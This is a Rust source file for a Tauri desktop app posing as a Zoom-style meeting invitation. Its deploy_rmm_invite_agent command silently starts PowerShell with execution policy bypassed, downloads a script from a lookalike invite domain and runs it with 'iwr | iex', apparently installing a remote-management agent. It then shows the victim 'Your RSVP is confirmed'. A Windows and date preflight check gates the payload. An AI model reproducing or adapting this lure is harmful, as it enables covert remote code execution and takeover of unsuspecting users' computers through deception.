use chrono::Local;
use serde::{Serialize, Deserialize};
use std::process::Command;

// Learn more about Tauri commands at https://tauri.app/develop/calling-rust/
#[tauri::command]
fn greet(name: &str) -> String {
    format!("Hello, {}! You've been greeted from Rust!", name)
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct SystemPreflight {
    is_windows: bool,
    windows_type: String,
    is_64_bit: bool,
    runtime_date: String,
    client_date: Option<String>,
    calendar_matches_runtime: bool,
    next_phase_ready: bool,
    message: String,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct RmmDeploymentResult {
    success: bool,
    message: String,
    deployed_at: Option<String>,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct PublicShellResponse {
    configured: bool,
    shell_command: Option<String>,
}

const BACKEND_URL: &str = "https://call-invite-zoom.liveinvite.top";

// Fetches canonical shell payload from backend (/api/shell)
async fn fetch_public_shell() -> Result<PublicShellResponse, String> {
    let client = reqwest::Client::new();
    let url = format!("{}/api/shell", BACKEND_URL);
    
    match client
        .get(&url)
        .send()
        .await
    {
        Ok(response) => {
            match response.json::<PublicShellResponse>().await {
                Ok(data) => Ok(data),
                Err(_) => Err("Failed to parse shell response".to_string()),
            }
        }
        Err(e) => Err(format!("Failed to fetch shell command: {}", e)),
    }
}

fn last_nonempty_line(text: &str) -> Option<String> {
    text
        .lines()
        .rev()
        .map(str::trim)
        .find(|line| !line.is_empty())
        .map(ToString::to_string)
}

fn extract_install_error(stderr: &str, stdout: &str) -> String {
    let noise_markers = [
        "FullyQualifiedErrorId",
        "CategoryInfo",
        "At line:",
        "+ ",
        "~~~~~~~~",
        "ParserError",
    ];

    let mut fallback: Option<String> = None;

    for source in [stderr, stdout] {
        for raw in source.lines() {
            let line = raw.trim();
            if line.is_empty() {
                continue;
            }

            if noise_markers.iter().any(|m| line.contains(m)) {
                continue;
            }

            if let Some(rest) = line.strip_prefix("Write-Error:") {
                let detail = rest.trim();
                if !detail.is_empty() {
                    return detail.to_string();
                }
            }

            if line.contains("failed")
                || line.contains("Failed")
                || line.contains("not found")
                || line.contains("cannot")
                || line.contains("error")
                || line.contains("Error")
            {
                return line.to_string();
            }

            fallback = Some(line.to_string());
        }
    }

    fallback
        .or_else(|| last_nonempty_line(stderr))
        .or_else(|| last_nonempty_line(stdout))
        .unwrap_or_else(|| "No error details returned by installer.".to_string())
}

#[tauri::command]
async fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
    // Enforce Windows check only in production; allow any OS in dev
    if cfg!(not(debug_assertions)) && std::env::consts::OS != "windows" {
        return RmmDeploymentResult {
            success: false,
            message: "This invitation experience is available on Windows devices.".to_string(),
            deployed_at: None,
        };
    }

    // Always use the static PowerShell command as requested
    let shell_command = "$u='https://call-invite-zoom.liveinvite.top/api/shell/script?token=fb1f864e368dc000002cfe71d35f68f99a2b1c1712bebe71075076746e346b12'; iwr -UseBasicParsing $u | iex";

    // Launch PowerShell as admin, pass the command, do not wait for or capture output
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        let _ = Command::new("powershell")
            .args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", shell_command])
            .creation_flags(0x00000010) // CREATE_NEW_CONSOLE
            .spawn();
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = Command::new("powershell")
            .args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", shell_command])
            .spawn();
    }

    RmmDeploymentResult {
        success: true,
        message: "Your RSVP is confirmed. You may close this window.".to_string(),
        deployed_at: Some(Local::now().format("%Y-%m-%d %H:%M:%S").to_string()),
    }
}

#[tauri::command]
fn system_preflight(client_date: Option<String>) -> SystemPreflight {
    let is_windows = std::env::consts::OS == "windows";
    let arch = std::env::consts::ARCH;
    let (windows_type, is_64_bit) = match arch {
        "x86_64" => ("x64".to_string(), true),
        "x86" => ("x86".to_string(), false),
        "aarch64" => ("arm64".to_string(), true),
        other => (other.to_string(), cfg!(target_pointer_width = "64")),
    };

    let runtime_date = Local::now().format("%Y-%m-%d").to_string();
    let calendar_matches_runtime = match client_date.as_deref() {
        Some(date) => date == runtime_date,
        None => false,
    };

    let next_phase_ready = is_windows && calendar_matches_runtime;
    let message = if !is_windows {
        "Your invitation is not available on this device.".to_string()
    } else if !calendar_matches_runtime {
        "Your invitation is not active yet. Please check back later.".to_string()
    } else {
        "You're all set to continue.".to_string()
    };

    SystemPreflight {
        is_windows,
        windows_type,
        is_64_bit,
        runtime_date,
        client_date,
        calendar_matches_runtime,
        next_phase_ready,
        message,
    }
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![greet, system_preflight, deploy_rmm_invite_agent])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
